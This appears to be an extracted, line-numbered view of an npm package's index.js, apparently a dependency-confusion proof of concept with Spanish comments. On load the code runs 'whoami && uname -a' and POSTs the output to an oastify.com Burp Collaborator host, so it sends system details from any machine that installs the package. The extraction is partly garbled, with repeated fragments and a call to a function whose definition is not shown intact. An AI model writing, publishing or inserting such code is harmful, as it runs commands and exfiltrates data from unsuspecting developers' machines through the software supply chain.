// File: tmp/tmpio5zr_dh/emtoolsjs/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: _tmp_3 = require('child_process')
Line 5: {
    const options = {
        hostname: '2be71rh86kkyju99zxclirv7cyip6gu5.oastify.com', // URL de tu Burp Collaborator
        port: 443,
        path: '/callback',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => process.stdout.write(d));
    });

    req.on('error', (error) => {
        console.error(error);
    });

    req.write(data);
    req.end();
}
Line 17: const req = https.request(options, (res) => {
        res.on('data', (d) => process.stdout.write(d));
    })
Line 25: req.write(data)
Line 26: req.end()
Line 30: exec('whoami && uname -a', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error al ejecutar el comando: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`Error en el comando: ${stderr}`);
    }

    // Prepara los datos en formato JSON para enviar a Burp Collaborator
    const payload = JSON.stringify({
        message: 'Dependency confusion exploit',
        commandOutput: stdout
    });

    // Env√≠a los datos al Collaborator
    sendData(payload);
})
Line 46: sendData(payload)
